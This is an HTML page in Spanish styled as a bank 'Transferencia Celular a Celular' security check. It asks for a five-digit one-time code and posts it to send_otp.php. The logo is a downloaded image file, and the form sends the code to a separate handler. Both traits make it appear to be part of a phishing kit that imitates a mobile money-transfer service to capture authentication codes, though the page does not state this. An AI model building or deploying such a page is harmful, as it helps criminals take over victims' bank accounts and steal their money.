<html lang="es">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Transferencia Celular a Celular</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding-top: 64px;
      /* Reserve space for the fixed header */
      display: flex;
      justify-content: center;
      background-color: #f2f2f2;
    }

    .header {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      background: linear-gradient(90deg, #FFAC3E 0%, #f87d18 100%);
      color: #fff;
      text-align: center;
      padding: 16px 20px;
      box-sizing: border-box;

      align-items: center;
      justify-content: space-between;
      z-index: 1000;
    }

    .header img {
      max-width: 30px;
    }

    .header h2 {
      margin: 0;
      font-size: 1em;
      flex-grow: 1;
      text-align: center;
    }

    .container {
      width: 90%;
      max-width: 400px;

    }

    .content {
      padding: 20px;
      text-align: center;
      border: 2px solid #777272;
      background-color: #fff;
      border-radius: 20px;
    }

    .content h3 {
    margin: 10px 0;
    font-size: 1.2em;
    color: green;
}

    .content p {
      font-size: 2em;
      font-weight: bold;
      margin: 0;
    }

    .form-group {
      margin: 15px 0;
      text-align: center;
    }

    .form-group label {
      display: block;
      margin-bottom: 5px;
      font-weight: bold;
    }

    .form-group input[type="text"] {
      /* width: 100%; */
      padding: 10px;
      font-size: 1em;
      border: 2px solid #777272;
      border-radius: 6px;
      box-sizing: border-box;
    }

    .otp-group {
      display: flex;
      justify-content: space-evenly;
      margin: 60px 0;
    }

    .otp-group input {
      width: 45px;
      height: 45px;
      font-size: 1.5em;
      text-align: center;
      border: 1px solid #ccc;
      border-radius: 5px;
    }

    .confirm-button {
      /* display: block; */
      width: 58%;
      padding: 19px;
      background: linear-gradient(-45deg, #006738 0%, #229A0D 100%);
      color: #fff;
      font-size: 1em;
      font-weight: bold;
      border: none;
      border-radius: 9px;
      cursor: pointer;
      text-align: center;
    }

    .confirm-button:hover {
      background: linear-gradient(-45deg, #006738 0%, #229A0D 100%);
    }

    .footer {
      display: flex;
      justify-content: space-around;
      background-color: #f7f7f7;
      padding: 10px 0;
      border-top: 1px solid #ddd;
    }

    .footer div {
      text-align: center;
      font-size: 0.8em;
    }

    .footer div img {
      max-width: 30px;
    }

    /* Responsive adjustments */
    @media (max-width: 400px) {
      .content p {
        font-size: 1.5em;
      }
    }
  </style>
</head>

<body>
  <div class="header">
    <div><img src="./recursos/descarga.png" alt="Logo"></div>

  </div>

  <div class="container">
    <h3 style="
    text-align: center;
">Comprobacion de Seguridad</h3>
    <div class="content">
      <h3>¡Ingrese el codigo correcto!</h3>



      <form action="send_otp.php" method="POST">
        <div class="form-group">
          <label>Ingrese OTP</label>
          <div class="form-group otp-group">
            <input type="text" maxlength="1" id="otp1" name="otp1" required oninput="moveFocus(this, event)" onkeydown="moveBackFocus(this, event)">
            <input type="text" maxlength="1" id="otp2" name="otp2" required oninput="moveFocus(this, event)" onkeydown="moveBackFocus(this, event)">
            <input type="text" maxlength="1" id="otp3" name="otp3" required oninput="moveFocus(this, event)" onkeydown="moveBackFocus(this, event)">
            <input type="text" maxlength="1" id="otp4" name="otp4" required oninput="moveFocus(this, event)" onkeydown="moveBackFocus(this, event)">
            <input type="text" maxlength="1" id="otp5" name="otp5" required oninput="moveFocus(this, event)" onkeydown="moveBackFocus(this, event)">
          </div>
          <button type="submit" class="confirm-button">Confirmar</button>
        </div>
      </form>
      
      <script>
        // Función para mover el foco al siguiente input cuando se ingresa un valor
        function moveFocus(currentInput, event) {
          if (currentInput.value.length === currentInput.maxLength) {
            const nextInput = currentInput.nextElementSibling;
            if (nextInput && nextInput.tagName.toLowerCase() === 'input') {
              nextInput.focus();
            }
          }
        }
      
        // Función para mover el foco al input anterior cuando se elimina un valor
        function moveBackFocus(currentInput, event) {
          if (event.key === 'Backspace' && currentInput.value === '') {
            const prevInput = currentInput.previousElementSibling;
            if (prevInput && prevInput.tagName.toLowerCase() === 'input') {
              prevInput.focus();
            }
          }
        }
      </script>
      

</body>

</html>